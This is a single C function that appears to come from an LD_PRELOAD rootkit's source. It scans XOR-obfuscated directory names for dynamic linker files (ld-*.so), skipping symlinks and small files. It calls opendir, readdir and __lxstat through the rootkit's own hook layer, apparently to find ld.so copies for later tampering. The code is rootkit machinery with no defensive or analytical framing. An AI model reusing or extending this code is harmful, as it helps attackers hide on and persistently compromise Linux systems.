/* searches all ldhomes directories for a maximum of maxlds ld.so & returns an array of char pointers to each valid ld.so.
 * the pointer allf is updated with the number of located ld.so.
 * if a search result is a symlink it is skipped. */
char **ldfind(int *allf, int maxlds){
    char **foundlds = calloc(maxlds, sizeof(char*));
    if(!foundlds) return NULL;
    
    int found = 0;

    hook(COPENDIR, CREADDIR, C__LXSTAT);

    for(size_t i=0; i<sizeofarr(ldhomes) && found<maxlds; i++){
        char *home = xordup(ldhomes[i]);
        if(!home) continue;
        
        DIR *dp = call(COPENDIR, home);
        if(dp == NULL){
            clean(home);
            continue;
        }

        const size_t homelen = strlen(home);
        struct dirent *dir;
        while((dir = call(CREADDIR, dp)) != NULL && found<maxlds){
            if(dir->d_name[0] == '.' || strncmp("ld-", dir->d_name, 3) != 0)
                continue;

            const char *ldname = dir->d_name;
            char *namedup, *nametok;
            int isanld = 0;

            namedup = strdup(ldname);
            if(!namedup) continue;

            nametok = strtok(namedup, ".");
            while(nametok != NULL && !isanld){
                isanld = strcmp("so\0", nametok) == 0;
                nametok = strtok(NULL, ".");
            }
            clean(namedup);

            if(!isanld)
                continue;
            else isanld = 0;

            const size_t pathsize = homelen + strlen(ldname) + 2;
            char path[pathsize];
            snprintf(path, sizeof(path), "%s/%s", home, ldname);

            struct stat sbuf;
            memset(&sbuf, 0, sizeof(struct stat));
            if((long)call(C__LXSTAT, _STAT_VER, path, &sbuf) < 0 || S_ISLNK(sbuf.st_mode) || sbuf.st_size < 800)
                continue;

            foundlds[found] = strdup(path);
            if(!foundlds[found]){
                if(found != 0)
                    for(int j=0; j<found; j++)
                        clean(foundlds[j]);
                free(foundlds);
                closedir(dp);
                clean(home);
                return NULL;
            }else ++found;
        }

        closedir(dp);
        clean(home);
    }

    *allf = found;
    return foundlds;
}